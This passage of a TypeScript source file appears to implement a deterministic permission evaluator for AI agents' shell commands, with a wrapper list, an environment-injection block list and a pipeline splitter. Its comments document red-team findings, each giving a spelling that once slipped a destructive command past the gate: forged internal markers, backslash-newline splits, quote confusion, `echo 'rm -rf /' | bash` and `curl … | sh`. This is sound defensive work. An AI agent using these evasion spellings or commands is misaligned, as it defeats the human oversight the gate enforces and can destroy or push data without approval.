// Evaluates a host tool call against the compiled authority table. Deterministic: no model involvement.
import { homedir, tmpdir } from 'node:os';
import { readFileSync, readdirSync, realpathSync, statSync } from 'node:fs';
import { dirname, isAbsolute, join, resolve, sep } from 'node:path';
import { shimScript, gitHooksDir, resolveHooksPath } from '../project/githooks.ts';
import { packageRoot } from '../launcher/self.ts';
import { git, gitConfigGet } from '../util/git.ts';
import type { CompiledAuthorityTable, CompiledMatcher } from './compile.ts';
import type { LocalTargets, TargetClass, Verdict } from '../control-plane/types.ts';
import { VERDICT_RANK } from '../control-plane/types.ts';

export interface EvaluationContext {
  profile: string;
  mode: string;
  /** absolute roots of registered repositories (workspace members) */
  repoRoots: string[];
  /** EGO_HOME, treated as inside-workspace for reads and kernel writes */
  egoHome?: string;
  /** capability ids granted ASK→ALLOW for the current task */
  grants?: string[];
  /** true when running inside the EGO source repository under EGO_MAINTENANCE */
  inEgoRepository?: boolean;
  cwd?: string;
  /** effect resolution (alignment item 5): override file access for tests; default reads the real filesystem */
  readFile?: (absPath: string) => string | null;
}

export interface ToolRequest {
  tool: string;
  input: Record<string, unknown>;
}

export interface CapabilityHit {
  capability: string;
  verdict: Verdict;
  via: string;
  segment?: string;
  absolute: boolean;
  grantApplied?: boolean;
  /** set when the hit was found inside the effect of a script, package script or make target */
  effectOf?: string;
  /** opacity that means "something WILL run that could not be read", as opposed to "the target does not exist" */
  opaqueUnread?: boolean;
}

export interface Evaluation {
  verdict: Verdict;
  hits: CapabilityHit[];
  reason: string;
  /** the most restrictive hit that decided the verdict */
  decisive?: CapabilityHit;
}

const WRAPPERS = new Set([
  // package-manager runners resolve a name to a local or fetched binary and then exec it. They were handled
  // inside individual matcher regexes (`(npx\s+)?…`) but NOT by the normalizer, so the matcher pass and the
  // producer dispatch read two different commands: `npx vitest run` matched `command.test` as if it were
  // `vitest run`, while the dispatch saw the head `npx` and claimed a bounded closure (challenge 8, finding 4).
  'npx',
  'bunx',
  'env',
  'nice',
  'time',
  'nohup',
  'command',
  'exec',
  'builtin',
  'stdbuf',
  'caffeinate',
  'setsid',
  'ionice',
  'chronic',
  'strace',
  'ltrace',
  'valgrind',
  'watch',
  'unbuffer',
  'nocorrect',
  'noglob',
  'chrt',
  'taskset',
  'numactl',
  'prlimit',
  'cpulimit',
  'eatmydata',
  'fakeroot',
  'proxychains',
  'proxychains4',
  'torsocks',
  'rlwrap',
  'sem',
  'arch',
  'daemonize',
  'xvfb-run',
  'firejail',
  'unshare',
  'nsenter',
  'systemd-run',
  'sandbox-exec',
  'busybox',
  'gtimeout',
]);
// `doas` is deliberately NOT a transparent wrapper: like `sudo`, it must keep its head so the command.privileged
// matcher that names it can fire (its inner command is analysed separately in normalizeTail).
/** wrapper options that consume the next token as their value (the command starts after it) */
/** `exec -a NAME prog` sets argv[0] to NAME and runs `prog`. Classifying NAME let an arbitrary program run as
 *  whatever the agent felt like calling it (exit review 3). */
// `exec`'s OWN options may precede the argv0 alias: `exec -c -a echo curl …` hid the real program behind the
// alias and reached ALLOW (exit review 4).
const EXEC_ARGV0_RE = /^exec\s+(?:-(?!a\b)[a-zA-Z-]+\s+)*(?:-a|--argv0)\s+\S+\s+/;
const WRAPPER_VALUE_OPTS: Record<string, RegExp> = {
  env: /^(-u|--unset|-C|--chdir|-S|--split-string)$/,
  nice: /^(-n|--adjustment)$/,
  ionice: /^(-c|-n|-p|--class|--classdata)$/,
  watch: /^(-n|--interval)$/, // `-d` is a flag (--differences), not a value option: it must not eat the command head
  stdbuf: /^-[ioe]$/,
  strace: /^-[opesEu]$/,
  ltrace: /^-[opesu]$/,
  valgrind: /^--tool$/,
  time: /^(-o|--output|-f|--format)$/,
  chrt: /^(-p|--pid)$/,
  taskset: /^(-p|--pid)$/,
  numactl: /^(-C|-N|-m|-p|--physcpubind|--cpunodebind|--membind|--preferred)$/,
  prlimit: /^(-p|--pid)$/,
  cpulimit: /^(-l|--limit|-p|--pid|-e|--exe)$/,
  'xvfb-run': /^(-n|-s|-e|-f|--server-num|--server-args)$/,
  'systemd-run': /^(-p|--property|-u|--unit|-E|--setenv|-M|--machine)$/,
  'sandbox-exec': /^(-f|-p|-n|-D)$/,
  nsenter: /^(-t|--target)$/,
  // macOS `arch`: `-arch NAME` selects the slice, `-d NAME` deletes an environment variable and `-e NAME=VALUE`
  // sets one. Without them `arch -arm64 -d ls bash -c '…'` handed `ls` to the head reader as the program and
  // the real `bash -c` behind it was never seen (exit review 9).
  arch: /^(-arch|-d|-e)$/,
  sem: /^(-j|--jobs|--id)$/,
  doas: /^(-u|-C)$/,
  gtimeout: /^(-s|--signal|-k|--kill-after)$/,
  timeout: /^(-s|--signal|-k|--kill-after)$/,
};
/** wrappers whose leading positional operands (a priority, a cpu mask, an architecture) precede the command */
const WRAPPER_POSITIONALS: Record<string, RegExp> = {
  chrt: /^\d+$/,
  taskset: /^(0x[0-9a-fA-F]+|[0-9,-]+)$/,
  timeout: /^\d+(\.\d+)?[smhd]?$/,
  gtimeout: /^\d+(\.\d+)?[smhd]?$/,
  arch: /^-?(arm64|arm64e|x86_64|i386)$/,
};
/** wrappers whose first argument is their own operand, not the command: the command starts after it */
const WRAPPERS_WITH_OPERAND = new Set(['flock', 'su', 'runuser']);
/** two-word runners: the pair is stripped so the real command is what everything downstream sees */
const WRAPPER_PAIRS: ReadonlyArray<readonly [string, string]> = [['pnpm', 'exec'], ['yarn', 'exec']];
/** environment assignments that change what a command executes or where governance looks: never silently stripped */
/** A NAME ON THIS LIST RE-POINTS WHAT A PROGRAM LOADS OR WHERE IT LOOKS. The list is an ENUMERATION, which is a
 *  shape that is wrong by omission — and it was: `XDG_CONFIG_HOME=/tmp/evil git status` makes git read its
 *  global configuration, aliases and hooks path from an attacker-chosen directory; `PERL5LIB` is the path twin
 *  of the `PERL5OPT` already listed; `LD_AUDIT` was in the code and missing from the matcher's own copy of the
 *  same set (exit review 10). The two copies are now generated from THIS one, so they cannot disagree again.
 */
const ENV_INJECT_RE =
  /^(LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]+|BASH_ENV|ENV|PS4|BASH_XTRACEFD|PROMPT_COMMAND|NODE_OPTIONS|PYTHONSTARTUP|PYTHONPATH|PERL5OPT|RUBYOPT|GIT_CONFIG[A-Z_]*|GIT_(DIR|WORK_TREE|INDEX_FILE|COMMON_DIR|SSH_COMMAND|SSH|PROXY_COMMAND|EXTERNAL_DIFF|EDITOR|PAGER|ASKPASS|CEILING_DIRECTORIES|NAMESPACE|ALTERNATE_OBJECT_DIRECTORIES|OBJECT_DIRECTORY|EXEC_PATH|TEMPLATE_DIR|ATTR_SOURCE)|EGO_[A-Z_]+|CLAUDE_[A-Z_]+|CODEX_[A-Z_]+|SSH_ASKPASS|SUDO_ASKPASS|SWIFT_EXEC|JAVA_TOOL_OPTIONS|JDK_JAVA_OPTIONS|_JAVA_OPTIONS|LD_AUDIT|KUBECONFIG|AWS_PROFILE|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|DOCKER_HOST|DOCKER_CONFIG|NPM_CONFIG_[A-Z_]+|HOME|PATH|SHELL|IFS|XDG_CONFIG_HOME|XDG_DATA_HOME|PERL5LIB|PERLLIB|PYTHONHOME|PYTHONEXECUTABLE|RUBYLIB|GEM_HOME|GEM_PATH|LUA_PATH|LUA_CPATH|CLASSPATH|JAVA_HOME|NODE_PATH|NODE_REPL_EXTERNAL_MODULE|BUN_INSTALL|DENO_DIR|CARGO_HOME|RUSTUP_HOME|GOPATH|GOROOT|GOBIN|COMPOSER_HOME|R_PROFILE_USER|R_HOME|MANPATH|TERMINFO|LD_BIND_NOW|LD_DEBUG_OUTPUT|GLIBC_TUNABLES|MALLOC_CONF|OBJC_INSERT_LIBRARIES|PHPRC|PHP_INI_SCAN_DIR|PYTHONUSERBASE|PYTHONPLATLIBDIR|GOCACHEPROG|GOENV|GOTOOLCHAIN|PKG_CONFIG|RUSTFLAGS|CARGO_ENCODED_RUSTFLAGS|CARGO_BUILD_RUSTFLAGS|CARGO_TARGET_[A-Z0-9_]*(?:RUSTFLAGS|LINKER|RUNNER)|CARGO_BUILD_RUSTC[A-Z_]*|RUSTC_WRAPPER|RUSTC_WORKSPACE_WRAPPER|RUSTDOC|RUSTC|(?:npm|NPM)_config_[A-Za-z_]+|LIQUIBASE_COMMAND_DEFAULTS_FILE|LIQUIBASE_COMMAND_[A-Z_]*FILE|FLYWAY_CONFIG_FILES|PGSERVICEFILE|PGPASSFILE|PGSSLROOTCERT|MYSQL_HOME|MYSQLSH_USER_CONFIG_HOME|MONGOSH_[A-Z_]*|REDISCLI_RCFILE|AWS_CA_BUNDLE|CURL_CA_BUNDLE|SSL_CERT_FILE|SSL_CERT_DIR|REQUESTS_CA_BUNDLE|NODE_EXTRA_CA_CERTS|BUNDLE_GEMFILE|BUNDLE_PATH|PIP_CONFIG_FILE)$/;

/** Options of a governed variable that actually LOAD CODE. `NODE_OPTIONS=--max-old-space-size=4096 npm test` is
 *  the standard fix for an out-of-memory build and it executes nothing; denying it while `npm test` on its own is
 *  ALLOW is a gate on ordinary work (exit review 7). The variable stays governed — `--require`, `--import` and
 *  the loaders are exactly why — but a value that cannot name a program is not an injection. */
const NODE_OPTIONS_EXECUTES = /--(require|import|loader|experimental-loader|experimental-vm-modules|cpu-prof-dir|heap-prof-dir|diagnostic-dir|inspect-publish-uid|env-file|conditions)\b|-r\b/;
/** True when this binding really changes what runs. */
function envInjects(name: string, assignment: string): boolean {
  const value0 = assignment.slice(assignment.indexOf('=') + 1).replace(/^['"]|['"]$/g, '');
  if (name === 'NODE_OPTIONS') {
    // node reads `--experimental_loader` and `--experimental-loader` as the SAME option, so the test normalises
    // the separator before looking (exit review 8). A LIST OF NAMES THAT LOAD CODE IS WRONG BY OMISSION -
    // `--inspect=0.0.0.0` opens a debugger port, `--openssl-config` loads a library, `--redirect-warnings=FILE` writes
    // a file - so what is accepted is a short list of options known to be inert, and everything else injects
    const value = value0.replace(/_/g, '-');
    if (NODE_OPTIONS_EXECUTES.test(value)) return true;
    return !value
      .split(/\s+/)
      .filter(Boolean)
      .every((o) => NODE_OPTIONS_INERT.test(o));
  }
  // a flags variable is inert unless its value reaches for a linker, a plugin or a wrapper program
  if (/^(?:RUSTFLAGS|CARGO_ENCODED_RUSTFLAGS|CARGO_BUILD_RUSTFLAGS|CARGO_TARGET_[A-Z0-9_]*RUSTFLAGS)$/.test(name))
    return /linker|link-arg|wrapper|-Z|plugin|codegen-backend|--config|--emit/.test(value0);
  // npm reads `npm_config_*` case-insensitively; most settings are harmless (`loglevel`, `color`), and these are not
  if (/^npm_config_/i.test(name))
    return /script[-_]shell|^npm_config_shell$|userconfig|globalconfig|prefix|cache|init[-_]module|node[-_]gyp|editor|git$|onload|scripts[-_]prepend|foreground|ignore[-_]scripts|registry|proxy|cafile|ca$|tmp/i.test(name);
  return true;
}
/** NODE_OPTIONS members that execute nothing and open nothing */
const NODE_OPTIONS_INERT =
  /^--(max-old-space-size|max-semi-space-size|stack-size|stack-trace-limit|enable-source-maps|no-warnings|trace-warnings|trace-deprecation|no-deprecation|throw-deprecation|unhandled-rejections|dns-result-order|openssl-legacy-provider|use-openssl-ca|use-bundled-ca|preserve-symlinks|preserve-symlinks-main|experimental-strip-types|experimental-transform-types|no-experimental-fetch|no-experimental-global-navigator|disable-warning|title|max-http-header-size|abort-on-uncaught-exception|experimental-default-type|no-network-family-autoselection)(=[\w.,:/-]*)?$|^[0-9]+$/;

/** THE SENTINEL THAT MAKES A STATE MARKER UNFORGEABLE.
 *
 *  The analyzer injects markers into the segment stream — `define-function`, `env-inject NAME`, `local-function`,
 *  `registry-fetch`, `force-ref-reset`, `heredoc-unterminated`, the subshell cwd restore — and the control plane
 *  matches them with ordinary regexes. They were plain words, so a COMMAND could spell one:
 *  `define-function git; git push origin main` made the analyzer believe `git` was a locally defined function,
 *  whose body it had already read, and the real push was classified `local-function …` — read-only, ALLOW. The
 *  same forgery reached `psql`, `aws`, `terraform`, `vault` and `argocd`, i.e. through absolute core denies
 *  (exit review 7).
 *
 *  Two locks, because one is not enough. FIRST, every marker carries this sentinel, so no ordinary command
 *  collides with one by accident. SECOND, `externalText` mangles the sentinel out of every byte that enters the
 *  analyzer from outside — the tool's command, a script line, a make recipe, a manifest script, a hook body — so
 *  no command can spell one on purpose either. A forged marker becomes ordinary text and is classified as what it
 *  is, rather than silencing the classification of what follows. */
const MARK = '\u0000ego\u0000';
/** Mangle EGO's own marker sentinel out of text that came from OUTSIDE the analyzer. Every hand-over of external
 *  bytes goes through here; the replacement keeps the length and the word shape, so what the reader sees is a
 *  plain unknown command rather than a marker. */
export function externalText(text: string): string {
  return text.includes(MARK) ? text.split(MARK).join('\uFFFDego\uFFFD') : text;
}

/** identity of each subshell the splitter opens, unique across nested calls */
let SUBSHELL_SEQ = 0;

/** A `cd` inside a subshell does NOT move the caller's directory, so the analyzer must stop claiming to know it
 *  once the subshell closes. Emitting this marker is how a flat segment list says so: the target carries a `$`, and
 *  a `cd` to a dynamic target is already the analyzer's "the working directory is no longer proven". */
const SUBSHELL_CWD_RESTORE = `${MARK}subshell-cwd-restore`;
/** marks a heredoc whose delimiter never arrived: the rest of the command was consumed as its body, so what this
 *  splitter returned is NOT the set of commands that will run */
const HEREDOC_UNTERMINATED = `${MARK}heredoc-unterminated`;
/** marks a function definition whose header the splitter consumed: it binds a name and executes nothing */
const FUNCTION_DEF_PREFIX = `${MARK}define-function`;
/** Closes a function BODY. The splitter inlines the body as ordinary sibling segments — which is right, because
 *  its commands must be analysed — but they are the FUNCTION's commands, not the caller's: `f() { cd sub; };
 *  tee control-plane/permissions/matchers.md` does not move the caller's working directory, and EGO followed the
 *  `cd` out of the body and resolved the governed path under `sub/` (exit review 10). The marker says where the
 *  body ends so the binding dimension can be suspended across it. */
const FUNCTION_BODY_END = `${MARK}end-function`;
/** UNBINDS a name a SUBSHELL defined. `git() { true; } & git push origin main` runs the definition in a
 *  background subshell and `echo $(git() { true; })` runs it in a substitution, so neither shadows the real
 *  program — and EGO believed both did, which made an organization-locked push read as a call to a known local
 *  function (exit review 10). A definition inside `( )` was already handled; these are its two other spellings. */
const FUNCTION_UNBIND = `${MARK}unbind-function`;
/** a segment that is only redirections — the tail of a group or subshell whose delimiters were consumed */
const REDIRECT_ONLY_RE = /^(?:(?:\d*(?:>>?|<>?)\|?|&>>?)\s*(?:"[^"]*"|'[^']*'|\S+)\s*)+$/;
/** shell keywords that may precede a command WITHOUT being one: after them, the next word is still a command */
const KEYWORD_PREFIX_RE = /^(if|then|else|elif|while|until|do|!|time|coproc)$/;
/** a function definition header: `f()`, `f ()`, `function f`, `function f ()` — structure, not a command */
/** A FUNCTION NAME IS ALMOST ANY WORD. bash and zsh both accept `./run.sh() { :; }` — verified with `-n` on
 *  this machine — and the name may hold a slash, a dot or a dash anywhere. Requiring it to START with a letter
 *  meant a definition like `./decoy.sh() { :; }` was not recognised as a definition at all: it was classified
 *  as an unknown command, which poisons the freshness ledger with the wildcard, and every later conclusion in
 *  that command line became STALE — so a script whose real contents are an absolute deny arrived as an
 *  approvable opacity instead (self-attack on exit review 9). The characters excluded are the ones the shell
 *  itself cannot have in a name here: whitespace and its own metacharacters. */
const FUNC_DEF_RE =
  /^(?:function\s+)?[^\s()<>|&;'"$`]+\s*\(\s*\)$|^function\s+[^\s()<>|&;'"$`]+$/;

/** One stage of a shell unit. A PIPELINE IS AN EXECUTION EDGE, not merely a separator: `echo 'rm -rf /' | bash`
 *  runs the first stage's standard output as the second stage's SCRIPT, and a model that discards the `|` cannot
 *  see that at all — the two stages look unrelated, and the effect crosses its authority floor between them
 *  (exit review 4). The edge is therefore part of the canonical analysis rather than a special case bolted on. */
export interface ShellStage {
  readonly text: string;
  /** true when this stage reads the PREVIOUS stage's standard output */
  readonly pipedFromPrevious: boolean;
  /** the heredoc body this stage was fed, when it opened one: that body IS its standard output */
  readonly heredocBody?: string;
  /** true when the heredoc delimiter was UNQUOTED, so the shell expands substitutions in the body */
  readonly heredocExpanded?: boolean;
  /** true when a PROCESS substitution was consumed into this stage: `bash <(echo CMD)` runs CMD, because the
   *  substitution hands the interpreter a file containing that command's output (exit review 5) */
  readonly fromProcessSubstitution?: boolean;
  /** The GROUP this stage belongs to, when the splitter consumed a `{ … }` or `( … )` around it. A group's
   *  standard output is the CONCATENATION of what its commands write, so the upstream of a pipe fed by one is
   *  the whole group: `{ echo 'git push origin main'; echo ls; } | sh` runs BOTH lines as the shell's script,
   *  and reading only the last stage lost the first (exit review 7). */
  readonly groupId?: number;
  /** true when the stage sits inside a `case … esac`: the arm that holds it is a branch that may not run */
  readonly inCase?: boolean;
  /** The operator that separated this stage from the one before it. `&&` and `||` make a stage conditional on the
   *  earlier one; `;` and a newline start a new chain; `&` says the EARLIER stage ran in the background. */
  readonly sepBefore?: '&&' | '||' | ';' | '\n' | '&' | '|';
  /** true when the stage runs in a subshell ( `( … )`, `$( … )`, a backtick span ): nothing it does to the working
   *  directory reaches the caller */
  readonly inSubshell?: boolean;
  /** the subshells this stage sits inside, outermost first. Stages that share an id share a shell, so a `cd` inside
   *  one is seen by the later stages of the SAME subshell and by nothing outside it. */
  readonly subshellPath?: readonly number[];
}

/** The segments of a command, with the pipeline edges between them. */
export function splitShellPipeline(command: string): ShellStage[] {
  const segments: Array<{
    text: string;
    pipedFromPrevious: boolean;
    heredocBody?: string;
    heredocExpanded?: boolean;
    fromProcessSubstitution?: boolean;
    inCase?: boolean;
    sepBefore?: '&&' | '||' | ';' | '\n' | '&' | '|';
    inSubshell?: boolean;
    subshellPath?: readonly number[];
  }> = [];
  /** the ids of the subshells the scanner is inside right now, outermost first */
  const subshellIds: number[] = [];
  /** the operator seen since the last stage was pushed; the next stage carries it */
  let lastSep: '&&' | '||' | ';' | '\n' | '&' | '|' | undefined;
  let sawProcessSubstitution = false;
  /** set by a `|` split and consumed by the NEXT stage, which is the one that reads the pipe */
  let pendingPipe = false;
  const consumePipe = (): boolean => {
    const p = pendingPipe;
    pendingPipe = false;
    return p;
  };
  let cur = '';
  let inSingle = false;
  let inDouble = false;
  let i = 0;
  // depth of SUBSHELLS whose parentheses this splitter consumed, and where the outermost one started
  let subshell = 0;
  let subshellStart = 0;
  // the stack of groups whose delimiters this splitter consumed, innermost last; every stage pushed while one is
  // open carries its id, which is what lets a piped stage read the WHOLE group's output
  let groupSeq = 0;
  const groupStack: number[] = [];
  // heredocs opened on the line being scanned; their BODIES are consumed when that line ends
  const pendingHeredocs: Array<{ delim: string; quoted: boolean; strip: boolean; openerIndex?: number }> = [];
  const push = () => {
    const t = cur.trim();
    // A REDIRECTION IS NOT A COMMAND. Consuming a group's braces leaves `{ echo a; echo b; } > out.txt` with a
    // headless `> out.txt`, which was classified as an unknown command and asked for an ordinary workspace write
    // (exit review 4). It belongs to the command it redirects, so it is re-attached to it.
    if (t) {
      if (segments.length && REDIRECT_ONLY_RE.test(t)) segments[segments.length - 1]!.text += ' ' + t;
      else
        segments.push({
          text: t,
          pipedFromPrevious: consumePipe(),
          fromProcessSubstitution: sawProcessSubstitution,
          // the OUTERMOST group: a nested `{ … }` inside a group is still part of the same standard output, and
          // keying on the innermost one broke the upstream run at the nested brace (exit review 8)
          ...(groupStack.length ? { groupId: groupStack[0]! } : {}),
          ...(caseDepth > 0 ? { inCase: true } : {}),
          ...(lastSep !== undefined ? { sepBefore: lastSep } : {}),
          ...(subshellIds.length ? { inSubshell: true, subshellPath: [...subshellIds] } : {}),
        });
      if (t) lastSep = undefined;
      sawProcessSubstitution = false;
      if (/^case\s+\S+\s+in(\s|$)/.test(t)) caseDepth++;
      else if (/^esac(?![\w=-])/.test(t)) caseDepth = Math.max(0, caseDepth - 1);
      // WHICH STAGE OPENED THE HEREDOC. Attributing the body to the LAST stage on the line was wrong the moment
      // anything followed the opener: in `bash <<EOF | cat` the body belongs to bash, and giving it to `cat` lost
      // the script entirely (exit review 5).
      for (const hd of pendingHeredocs)
        if (hd.openerIndex === undefined && new RegExp(`<<-?\\s*['"\\\\]?${hd.delim}`).test(t))
          hd.openerIndex = segments.length - 1;
    }
    cur = '';
  };
  let caseDepth = 0;
  /** groups opened by a function DEFINITION, mapped to the name, so the closing brace can say where the body ends */
  const functionBodyGroups = new Map<number, string>();
  /** the name and end position of the most recent function body, for the `&` that may background it */
  let lastFnDefEnd: { name: string; at: number } | null = null;
  /** true where a COMMAND may begin: nothing pending, or only a shell keyword */
  const atCommandStart = (): boolean => cur.trim() === '' || KEYWORD_PREFIX_RE.test(cur.trim());
  /** true where a FUNCTION BODY may begin: the pending text is the definition header and nothing else */
  const atFunctionBody = (): boolean => FUNC_DEF_RE.test(cur.trim());
  while (i < command.length) {
    const ch = command[i]!;
    const next = command[i + 1];
    // A BACKSLASH-NEWLINE IS REMOVED BEFORE TOKENIZATION, INCLUDING IN THE MIDDLE OF A WORD. The shell deletes
    // the pair before it parses anything, so `do\<newline>cker run …` IS `docker run …` — verified against
    // bash, zsh and dash, which all execute the joined program name. Keeping the pair left the head reading as
    // `do`, which is in the shell-keyword read-only matcher, and the whole line was classified read-only: a
    // recursive delete of a production S3 bucket reached ALLOW, and so did writes to `.gi\<newline>t/hooks/`,
    // `.harn\<newline>ess/runtime/` and `.hus\<newline>ky/` (exit review 8). Inside SINGLE quotes there is no
    // escape at all, so the pair stays literal there.
    if (ch === '\\' && next === '\n' && !inSingle) {
      i += 2;
      continue;
    }
    if (ch === '\\' && !inSingle) {
      cur += ch + (next ?? '');
      i += 2;
      continue;
    }
    // `$'…'` IS AN ANSI-C STRING, AND A BACKSLASH ESCAPES INSIDE IT. An ordinary single-quoted string has no
    // escapes at all, so the scanner read `$'\''` as quote-open, backslash, quote-close, quote-OPEN — and believed
    // it was inside a quote for the whole rest of the line. Everything after it collapsed into one `echo`-headed
    // segment: `echo $'\'' && sh -c 'git push origin main'` was ALLOW, and so was every other DENY spelled after
    // it, including the trust store and `curl … | sh` (exit review 7). `$"…"` is an ordinary double-quoted string
    // with translation, so it needs no special case beyond not being read as a `$`-headed word.
    if (ch === '$' && next === "'" && !inSingle && !inDouble) {
      let j = i + 2;
      let body = '';
      while (j < command.length) {
        if (command[j] === '\\' && j + 1 < command.length) {
          body += command[j]! + command[j + 1]!;
          j += 2;
          continue;
        }
        if (command[j] === "'") break;
        body += command[j]!;
        j++;
      }
      cur += "$'" + body + "'";
      i = j + 1;
      continue;
    }
    if (ch === "'" && !inDouble) inSingle = !inSingle;
    else if (ch === '"' && !inSingle) inDouble = !inDouble;
    if (!inSingle && !inDouble) {
      if ((ch === '&' && next === '&') || (ch === '|' && next === '|')) {
        push();
        lastSep = ch === '&' ? '&&' : '||';
        i += 2;
        continue;
      }
      // A HEREDOC BODY IS DATA, NOT COMMANDS. The top-level splitter had no heredoc tracking at all, so the prose
      // of `cat > NOTES.md <<'MD' … MD` was classified: a release note containing `git push origin main --tags`
      // was DENIED as a push (exit review 4). A QUOTED delimiter means no expansion, so the body is inert; an
      // UNQUOTED one still expands `$( )` and backticks, and those substitutions really do run.
      // `$[ … ]` and `$(( … ))` both hold ARITHMETIC, where `<<` is a LEFT SHIFT. The old form was not
      // recognised here, so `echo $[1<<true]` opened a heredoc named `true` — and a later line saying `true`
      // terminated it, making every line between them the body and hiding a `git push origin main` completely
      // (exit review 8). The whole expression is consumed as the one word it is.
      if (ch === '$' && next === '[') {
        const close = command.indexOf(']', i + 2);
        if (close > 0) {
          cur += command.slice(i, close + 1);
          i = close + 1;
          continue;
        }
      }
      if (ch === '<' && next === '<') {
        // `<<<` is a HERESTRING: it carries data and opens nothing. Consuming all three is what keeps the scanner
        // from reading the SECOND `<` as the start of a heredoc whose delimiter never arrives — which swallowed
        // the whole rest of a script body.
        if (command[i + 2] === '<') {
          cur += '<<<';
          i += 3;
          continue;
        }
        const opener = /^<<(-?)\s*(?:'([^']*)'|"([^"]*)"|(\\?)([A-Za-z_][A-Za-z0-9_]*))/.exec(command.slice(i));
        if (opener) {
          const delim = opener[2] ?? opener[3] ?? opener[5] ?? '';
          pendingHeredocs.push({
            delim,
            quoted: opener[2] !== undefined || opener[3] !== undefined || opener[4] === '\\',
            strip: opener[1] === '-',
          });
          cur += opener[0]; // the redirection stays part of the command that opens it
          i += opener[0].length;
          continue;
        }
      }
      // a `|` preceded by `>` is the `>|` noclobber-override redirect operator, not a pipe — do not split there
      if (ch === ';' || ch === '\n' || (ch === '|' && command[i - 1] !== '>')) {
        const piped = ch === '|';
        push();
        lastSep = ch === '|' ? '|' : ch === ';' ? ';' : '\n';
        if (ch === '\n' && pendingHeredocs.length) {
          let k = i + 1;
          for (const hd of pendingHeredocs) {
            const opener = segments[hd.openerIndex ?? segments.length - 1];
            let body = '';
            let terminated = false;
            while (k < command.length) {
              const nl = command.indexOf('\n', k);
              const line = command.slice(k, nl < 0 ? command.length : nl);
              k = nl < 0 ? command.length : nl + 1;
              if ((hd.strip ? line.replace(/^\t+/, '') : line).trim() === hd.delim) {
                terminated = true;
                break;
              }
              body += line + '\n';
            }
            // A HEREDOC BODY IS ONE OF THREE THINGS, and the SHELL decides which — verified against bash and dash.
            //   1. a SCRIPT, when the command reading it takes its program from stdin (`bash <<EOF`);
            //   2. an EXPANSION SITE, when the delimiter is UNQUOTED: `$( )` and backticks run, and there is NO
            //      quoting inside the body at all — `'` and `"` are ordinary characters there;
            //   3. inert DATA, when the delimiter is quoted.
            // Modelling only (3) made `bash <<EOF … git push … EOF` ask instead of denying (exit review 4).
            // the opener's ROLE is read in canonical form: a keyword, a case pattern or a subshell in front of it
            // made `then bash <<EOF` and `a) bash <<EOF` look like commands named `then` and `a)` (exit review 5)
            if (opener && readsScriptFromStdin(emitterTail(opener.text)))
              for (const sg of splitShellPipeline(body)) segments.push(sg);
            else if (!hd.quoted)
              for (const innerCmd of substitutionsIn(body))
                for (const sg of splitShellPipeline(innerCmd)) segments.push(sg);
            if (opener) {
              // the body is also this stage's STANDARD OUTPUT, which a following `| sh` would run
              opener.heredocBody = (opener.heredocBody ?? '') + body;
              opener.heredocExpanded = opener.heredocExpanded === true || !hd.quoted;
            }
            // A heredoc whose delimiter never arrives means the command was misread: everything after it was
            // consumed as data, so say so rather than returning a short list that looks complete.
            if (!terminated) segments.push({ text: HEREDOC_UNTERMINATED, pipedFromPrevious: false });
          }
          pendingHeredocs.length = 0;
          i = k;
          continue;
        }
        // EACH STAGE OF A PIPELINE IS ITS OWN SUBSHELL: `cd sub | true ; make build` leaves the caller where it
        // was, and the analyzer followed the `cd` out of it (exit review 4).
        if (piped) pendingPipe = true;
        if (piped && directoryChange(segments[segments.length - 1]?.text ?? '') !== null)
          segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
        i++;
        continue;
      }
      // `&` IN A REDIRECTION IS NOT THE BACKGROUND OPERATOR. `2>&1`, `>&2` and `&> log` were split there, which
      // produced a phantom command named `1` and — worse — orphaned the target of `>&FILE`, so a write to a
      // governed path asked instead of being denied (exit review 4).
      if (ch === '&' && next !== '&' && next !== '>' && command[i - 1] !== '>' && command[i - 1] !== '<') {
        push();
        lastSep = '&';
        // A BACKGROUND COMMAND IS ITS OWN SUBSHELL, exactly as a pipeline stage is. `cd sub & tee
        // control-plane/permissions/matchers.md` leaves the caller where it was, and the analyzer followed the
        // `cd` out of it — the same defect exit review 4 fixed for the pipe spelling, in the branch beside it
        // (exit review 10). A DEFINITION before `&` binds nothing outside either: `git() { true; } & git push
        // origin main` does not shadow git, and EGO believed it did.
        if (directoryChange(segments[segments.length - 1]?.text ?? '') !== null)
          segments.push({ text: SUBSHELL_CWD_RESTORE, pipedFromPrevious: false });
        // a DEFINITION that the `&` backgrounds runs in that subshell and binds nothing in the caller. The body
        // sits between the header and here, so the closing brace records where it ended and this tests whether
        // the `&` is what immediately follows it.
        if (lastFnDefEnd !== null && lastFnDefEnd.at === segments.length) {
          segments.push({ text: `${FUNCTION_UNBIND} ${lastFnDefEnd.name}`, pipedFromPrevious: false });
          lastFnDefEnd = null;
        }
        i++;
        continue;
      }
      // A COMMENT IS NOT COMMAND TEXT, and it is where an unpaired quote hides. `echo hi  # isn't ready` put the
      // scanner into a phantom single-quoted state, and every following LINE of a multi-line command was swallowed
      // into it — `git push --force origin main` on the next line never became a segment and the whole call was
      // ALLOW (exit review 4). A `#` starts a comment only at the start of a WORD, exactly as in the shell, so
      // `http://x/#frag` and `--pretty=%h#` are untouched.
      // a `#` starts a comment at the start of a WORD — which is after whitespace OR after any unquoted operator
      // that ends one. `echo hi;# it's fine` put the scanner into a phantom quoted state through the apostrophe
      // (exit review 6).
      if (ch === '#' && (i === 0 || /[\s;&|()]/.test(command[i - 1]!))) {
        const nl = command.indexOf('\n', i);
        i = nl < 0 ? command.length : nl; // the newline itself still separates the commands
        continue;
      }
      // A SUBSHELL AND A BRACE GROUP ARE SHELL STRUCTURE, NOT COMMANDS. Their delimiters were kept inside the
      // segment, so the head became `(` and every anchored matcher missed: `( chmod 777 /etc/passwd )` was
      // command.unknown — an ASK — where the same line without the parentheses is DENY (corpus by semantic class,
      // 2026-09-24). `((` is arithmetic, which runs no command, and is deliberately left alone; a `)` that closes
      // nothing this splitter opened — a `case` pattern — stays literal.
      // `((` AT A COMMAND POSITION IS TWO NESTED SUBSHELLS, not arithmetic. A POSIX shell has no `(( ))` command,
      // so `((chmod 777 /etc/passwd))` runs the chmod under dash — and under bash it is a syntax error, which
      // executes nothing. Reading it as subshells is therefore right where it runs and harmless where it does not;
      // leaving it alone was a floor crossing (exit review 4). Standalone bash arithmetic `(( i++ ))` asked before
      // this and asks after it.
      if (ch === '(' && atCommandStart()) {
        if (subshell === 0) subshellStart = segments.length;
        subshell++;
